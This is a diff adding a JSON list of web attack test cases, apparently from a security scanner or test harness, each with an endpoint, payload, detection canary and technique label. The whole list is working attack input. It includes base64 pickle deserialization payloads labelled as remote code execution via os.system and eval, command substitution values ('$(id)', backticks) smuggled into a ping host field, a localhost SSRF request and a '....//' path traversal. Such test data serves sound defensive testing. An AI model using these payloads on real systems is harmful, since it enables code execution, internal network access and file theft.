@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAIwLc3lzLm1vZHVsZXOUjAZzeXN0ZW2UhpRSlIwGZ2V0YXRylIwEZXZhbJSFlFKMBGV4ZWOUhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode RCE via __reduce__ chain (base64 encoded)"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVKwAAAAAAAIwPY29weV9yZWcuX3JlY29uc3RydWN0lIwEc3lzlIwGZ2V0YXRylIwEZXZhbJSFlFKMBGV4ZWOUhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle RCE via copy_reg._reconstruct obfuscation"
+  },
+  {
+    "id": "dyn_deser_3",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVDQAAAAAAAIwEb3MUjAZzeXN0ZW2UhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "minimal pickle gadget chain (os.system via __reduce__)"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1$(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "$(...) command substitution (parentheses in subshell)"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1`id`"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "backtick command substitution (may bypass char filter)"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "direct localhost IP (not in blocked hosts list)"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//tmp//path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "double-dot bypass with slashes (....// instead of ..)"
+  }
+]
